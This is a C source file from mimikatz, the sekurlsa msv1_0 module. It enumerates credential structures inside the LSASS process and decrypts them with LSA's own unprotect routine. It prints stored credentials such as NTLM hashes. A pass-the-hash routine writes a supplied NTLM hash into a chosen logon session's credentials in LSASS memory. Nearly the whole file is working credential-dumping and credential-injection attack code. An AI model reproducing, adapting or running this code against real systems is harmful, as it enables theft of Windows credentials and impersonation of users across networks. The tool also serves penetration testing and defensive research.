/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kuhl_m_sekurlsa_msv1_0.h"

const ANSI_STRING
	PRIMARY_STRING = {7, 8, "Primary"},
	CREDENTIALKEYS_STRING = {14, 15, "CredentialKeys"};

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_msv_package = {L"msv", kuhl_m_sekurlsa_enum_logon_callback_msv, TRUE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_msv_single_package[] = {&kuhl_m_sekurlsa_msv_package};

NTSTATUS kuhl_m_sekurlsa_msv(int argc, wchar_t * argv[])
{
	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_msv_single_package, 1);
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	kuhl_m_sekurlsa_msv_enum_cred(pData->cLsass, pData->pCredentials, kuhl_m_sekurlsa_msv_enum_cred_callback_std, pData->LogonId);
}

BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_std(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PKIWI_MSV1_0_PRIMARY_CREDENTIALS pCredentials, IN DWORD AuthenticationPackageId, IN PKULL_M_MEMORY_ADDRESS origBufferAddress, IN OPTIONAL LPVOID pOptionalData)
{
	DWORD flags = KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL;
	kprintf(L"\n\t [%08x] %Z", AuthenticationPackageId, &pCredentials->Primary);
	if(RtlEqualString(&pCredentials->Primary, &PRIMARY_STRING, FALSE))
		flags |= (cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10)  ? KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY : KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY_10;
	else if(RtlEqualString(&pCredentials->Primary, &CREDENTIALKEYS_STRING, FALSE))
		flags |= KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY;

	kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &pCredentials->Credentials, (PLUID) pOptionalData, flags);
	return TRUE;
}

BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_pth(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PKIWI_MSV1_0_PRIMARY_CREDENTIALS pCredentials, IN DWORD AuthenticationPackageId, IN PKULL_M_MEMORY_ADDRESS origBufferAddress, IN OPTIONAL LPVOID pOptionalData)
{
	PMSV1_0_PRIMARY_CREDENTIAL pPrimaryCreds = (PMSV1_0_PRIMARY_CREDENTIAL) (pCredentials->Credentials.Buffer);
	PMSV1_0_PRIMARY_CREDENTIAL_10 pPrimaryCreds10 = (PMSV1_0_PRIMARY_CREDENTIAL_10) (pCredentials->Credentials.Buffer);
	PMSV1_0_PTH_DATA_CRED pthDataCred = (PMSV1_0_PTH_DATA_CRED) pOptionalData;
	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aLocalMemory = {pPrimaryCreds, &hLocalMemory};

	if(RtlEqualString(&pCredentials->Primary, &PRIMARY_STRING, FALSE))
	{
		(*pthDataCred->pSecData->lsassLocalHelper->pLsaUnprotectMemory)(pCredentials->Credentials.Buffer, pCredentials->Credentials.Length);
		if(cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10)
		{
			if(pthDataCred->pthData->NtlmHash)
			{
				RtlCopyMemory(pPrimaryCreds->NtOwfPassword, pthDataCred->pthData->NtlmHash, LM_NTLM_HASH_LENGTH);
				pPrimaryCreds->isNtOwfPassword = TRUE;
			}
			else
			{
				RtlZeroMemory(pPrimaryCreds->NtOwfPassword, LM_NTLM_HASH_LENGTH);
				pPrimaryCreds->isNtOwfPassword = FALSE;
			}
			RtlZeroMemory(pPrimaryCreds->LmOwfPassword, LM_NTLM_HASH_LENGTH);
			RtlZeroMemory(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH);
			pPrimaryCreds->isLmOwfPassword = FALSE;
			pPrimaryCreds->isShaOwPassword = FALSE;
		}
		else
		{
			if(pthDataCred->pthData->NtlmHash)
			{
				RtlCopyMemory(pPrimaryCreds10->NtOwfPassword, pthDataCred->pthData->NtlmHash, LM_NTLM_HASH_LENGTH);
				pPrimaryCreds10->isNtOwfPassword = TRUE;
			}
			else
			{
				RtlZeroMemory(pPrimaryCreds10->NtOwfPassword, LM_NTLM_HASH_LENGTH);
				pPrimaryCreds10->isNtOwfPassword = FALSE;
			}
			RtlZeroMemory(pPrimaryCreds10->LmOwfPassword, LM_NTLM_HASH_LENGTH);
			RtlZeroMemory(pPrimaryCreds10->ShaOwPassword, SHA_DIGEST_LENGTH);
			pPrimaryCreds10->isIso = FALSE;
			pPrimaryCreds10->isLmOwfPassword = FALSE;
			pPrimaryCreds10->isShaOwPassword = FALSE;
		}
		(*pthDataCred->pSecData->lsassLocalHelper->pLsaProtectMemory)(pCredentials->Credentials.Buffer, pCredentials->Credentials.Length);

		kprintf(L"data copy @ %p : ", origBufferAddress->address);
		if(pthDataCred->pthData->isReplaceOk = kull_m_memory_copy(origBufferAddress, &aLocalMemory, pCredentials->Credentials.Length))
			kprintf(L"OK !");
		else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
	}
	else kprintf(L".");

	return TRUE;
}

BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_msv_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
	PSEKURLSA_PTH_DATA pthData = (PSEKURLSA_PTH_DATA) pOptionalData;
	MSV1_0_PTH_DATA_CRED credData = {pData, pthData};
	
	if(RtlEqualLuid(pData->LogonId, pthData->LogonId))
	{
		kuhl_m_sekurlsa_msv_enum_cred(pData->cLsass, pData->pCredentials, kuhl_m_sekurlsa_msv_enum_cred_callback_pth, &credData);
		return FALSE;
	}
	else return TRUE;
}

VOID kuhl_m_sekurlsa_msv_enum_cred(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PVOID pCredentials, IN PKUHL_M_SEKURLSA_MSV_CRED_CALLBACK credCallback, IN PVOID optionalData)
{
	KIWI_MSV1_0_CREDENTIALS credentials;
	KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &hLocalMemory}, aLsassMemory = {pCredentials, cLsass->hLsassMem};

	while(aLsassMemory.address)
	{
		aLocalMemory.address = &credentials;
		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_CREDENTIALS)))
		{
			aLsassMemory.address = credentials.PrimaryCredentials;
			while(aLsassMemory.address)
			{
				aLocalMemory.address = &primaryCredentials;
				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)))
				{
					aLsassMemory.address = primaryCredentials.Credentials.Buffer;
					if(kull_m_string_getUnicodeString(&primaryCredentials.Credentials, cLsass->hLsassMem))
					{
						if(kull_m_string_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Primary, cLsass->hLsassMem))
						{
							credCallback(cLsass, &primaryCredentials, credentials.AuthenticationPackageId, &aLsassMemory, optionalData);
							LocalFree(primaryCredentials.Primary.Buffer);
						}
						LocalFree(primaryCredentials.Credentials.Buffer);
					}
				} else kprintf(L"n.e. (KIWI_MSV1_0_PRIMARY_CREDENTIALS KO)");
				aLsassMemory.address = primaryCredentials.next;
			}
			aLsassMemory.address = credentials.next;
		} else kprintf(L"n.e. (KIWI_MSV1_0_CREDENTIALS KO)");
	}
}